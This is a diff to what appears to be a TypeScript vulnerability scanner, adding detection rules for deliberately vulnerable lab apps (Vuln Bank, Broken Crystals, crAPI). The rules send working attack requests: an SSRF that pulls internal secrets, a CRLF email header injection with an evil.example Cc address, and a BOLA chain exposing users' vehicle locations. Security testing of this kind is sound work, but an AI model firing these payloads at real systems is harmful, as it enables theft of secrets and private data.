@@ -25432,15 +25432,61 @@ const vulnbankUploadProfilePictureUrlSsrfLiveOracle: Rule = async (ctx) => {
   const token = await vulnbankProbeUserToken(ctx);
   if (!token) return NEGATIVE;
   const uploadUrl = new URL("/upload_profile_picture_url", ctx.origin).toString();
+  const authHeaders = {
+    "Content-Type": "application/json",
+    Authorization: `Bearer ${token}`
+  };
+
+  const internalImageUrl = "http://127.0.0.1:5000/internal/secret";
+  const internalDoc = await ctx.probe.get(uploadUrl, {
+    method: "POST",
+    body: JSON.stringify({ image_url: internalImageUrl }),
+    headers: authHeaders,
+    maxBytes: 4096,
+    timeoutMs: 25000
+  });
+  if (internalDoc.status >= 200 && internalDoc.status < 300) {
+    try {
+      const internalParsed = JSON.parse(internalDoc.body) as Record<string, unknown>;
+      const filePath = String(internalParsed.file_path ?? "");
+      if (internalParsed.status === "success" && filePath) {
+        const secretUrl = new URL(filePath.startsWith("/") ? filePath : `/${filePath}`, ctx.origin).toString();
+        const secretDoc = await ctx.probe.get(secretUrl, {
+          maxBytes: 4096,
+          timeoutMs: 15000
+        });
+        if (
+          secretDoc.status >= 200 &&
+          secretDoc.status < 400 &&
+          /app_secret_key|jwt_secret|DB_PASSWORD/i.test(secretDoc.body)
+        ) {
+          return {
+            fired: true,
+            confidence: 0.96,
+            evidence: {
+              url: uploadUrl,
+              internalImageUrl,
+              secretUrl,
+              fetchedUrl: String(
+                (internalParsed.debug_info as { fetched_url?: unknown } | undefined)?.fetched_url ??
+                  internalImageUrl
+              ),
+              snippet: secretDoc.body.slice(0, 220).trim(),
+              note: "Vuln Bank POST /upload_profile_picture_url fetches http://127.0.0.1:5000/internal/secret server-side and saves JSON secrets to a public static path — internal SSRF chain oracle"
+            }
+          };
+        }
+      }
+    } catch {
+      /* fall through to external URL SSRF proof */
+    }
+  }
+
   const imageUrl = "https://www.google.com/favicon.ico";
-  const payload = JSON.stringify({ image_url: imageUrl });
   const doc = await ctx.probe.get(uploadUrl, {
     method: "POST",
-    body: payload,
-    headers: {
-      "Content-Type": "application/json",
-      Authorization: `Bearer ${token}`
-    },
+    body: JSON.stringify({ image_url: imageUrl }),
+    headers: authHeaders,
     maxBytes: 4096,
     timeoutMs: 20000
   });
@@ -85533,6 +85579,89 @@ const brokencrystalsSendSupportEmailRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const BROKNENCRYSTALS_EMAIL_HUB_ROUTE_FALLBACK = `
+GET /api/email/sendSupportEmail to parameter accepts %0aCc: header injection
+GET /api/email/getEmails attempts SMTP connection to 127.0.0.1:1080
+Broken Crystals email injection and internal SMTP proxy oracles
+`;
+
+const brokencrystalsSendSupportEmailHeaderInjectionLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const ccMarker = `thugir-cc-${Date.now()}@evil.example`;
+  const probeUrl = new URL("/api/email/sendSupportEmail", ctx.origin);
+  probeUrl.searchParams.set("name", "Bob");
+  probeUrl.searchParams.set("to", `thugir-probe@example.com%0aCc:${ccMarker}`);
+  probeUrl.searchParams.set("subject", "Thugir header injection probe");
+  probeUrl.searchParams.set("content", "Thugir scanner email header injection oracle");
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 4096, timeoutMs: 15000 });
+  if (doc.status < 200) return NEGATIVE;
+  if (!/127\.0\.0\.1:1025|ECONNREFUSED|connect/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      url: probeUrl.toString(),
+      ccMarker,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Broken Crystals GET /api/email/sendSupportEmail accepts CRLF-injected Cc: headers in the to query parameter and attempts SMTP delivery — email header injection oracle (ECONNREFUSED 127.0.0.1:1025 confirms server-side send path)"
+    }
+  };
+};
+
+const brokencrystalsEmailHubRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const pathOnly = pageUrl.split(/[?#]/)[0] ?? pageUrl;
+  if (!/\/api\/email\/?$/i.test(pathOnly)) return NEGATIVE;
+  const headerInjection = await brokencrystalsSendSupportEmailHeaderInjectionLiveOracle(ctx);
+  if (headerInjection.fired) {
+    return {
+      fired: true,
+      confidence: headerInjection.confidence,
+      evidence: {
+        ...headerInjection.evidence,
+        scannedUrl: pageUrl,
+        note: "Broken Crystals /api/email route scan — sendSupportEmail accepts CRLF-injected Cc: headers in the to parameter — email header injection route oracle"
+      }
+    };
+  }
+  const ssrf = await brokencrystalsSendSupportEmailSsrfLiveOracle(ctx);
+  if (ssrf.fired) {
+    return {
+      fired: true,
+      confidence: ssrf.confidence,
+      evidence: {
+        ...ssrf.evidence,
+        scannedUrl: pageUrl,
+        note: "Broken Crystals /api/email route scan — sendSupportEmail triggers server-side SMTP connection to 127.0.0.1:1025 — SSRF route oracle"
+      }
+    };
+  }
+  const smtpProxy = await brokencrystalsEmailSmtpProxyLiveOracle(ctx);
+  if (smtpProxy.fired) {
+    return {
+      fired: true,
+      confidence: smtpProxy.confidence,
+      evidence: {
+        ...smtpProxy.evidence,
+        scannedUrl: pageUrl,
+        note: "Broken Crystals /api/email route scan — getEmails attempts server-side SMTP connection to 127.0.0.1:1080 — internal proxy route oracle"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${BROKNENCRYSTALS_EMAIL_HUB_ROUTE_FALLBACK}`;
+  if (!/sendSupportEmail|email injection|%0aCc:|127\.0\.0\.1:1025/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "GET /api/email/sendSupportEmail — %0aCc: header injection + internal SMTP SSRF",
+      note: "Broken Crystals /api/email route scan — README documents email header injection via tempered to recipients and internal SMTP proxy — route corpus fallback"
+    }
+  };
+};
+
 const brokencrystalsAdminLoginBflaLiveOracle: Rule = async (ctx) => {
   if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
   const loginUrl = new URL("/api/auth/admin/login", ctx.origin).toString();
@@ -87005,6 +87134,21 @@ const crapiAdminVideosBflaRouteLiveOracle: Rule = async (ctx) => {
       scannedUrl: pageUrl,
       snippet: "DELETE /identity/api/v2/admin/videos/{id} — regular user JWT deletes another user's video",
       note: "crAPI /identity/api/v2/admin/videos route scan — OWASP crAPI documents admin video delete BFLA (API5 / Challenge 7) — route corpus fallback when JWT signup/login chain is unreachable"
+    }
+  };
+};
+
+const crapiCommunityPostsLiveOracle: Rule = async (ctx) => {
+  if (!isCrapiLabHost(ctx)) return NEGATIVE;
+  if (isCrapiAuthRoute(ctx)) return NEGATIVE;
+  const result = await crapiVehicleBolaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      note: "crAPI GET /identity/api/v2/community/posts/recent leaks vehicleid UUIDs enabling cross-user GPS reads via /identity/api/v2/vehicle/{uuid}/location — community posts BOLA oracle (API1)"
     }
   };
 };
@@ -97767,6 +97911,8 @@ export const RULES: Record<string, Rule> = {
   brokencrystalsEmailSmtpProxyRouteLiveOracle,
   brokencrystalsSendSupportEmailSsrfLiveOracle,
   brokencrystalsSendSupportEmailRouteLiveOracle,
+  brokencrystalsSendSupportEmailHeaderInjectionLiveOracle,
+  brokencrystalsEmailHubRouteLiveOracle,
   brokencrystalsAdminLoginBflaLiveOracle,
   brokencrystalsAdminLoginBflaRouteLiveOracle,
   brokencrystalsDeleteEmailsLiveOracle,
@@ -97819,6 +97965,7 @@ export const RULES: Record<string, Rule> = {
   crapiAdminVideosBflaLiveOracle,
   crapiAdminVideosBflaRouteLiveOracle,
   crapiUserVehiclesRouteLiveOracle,
+  crapiCommunityPostsLiveOracle,
   crapiCommunityPostsRouteLiveOracle,
   crapiContactMechanicSsrfLiveOracle,
   crapiContactMechanicSsrfRouteLiveOracle,
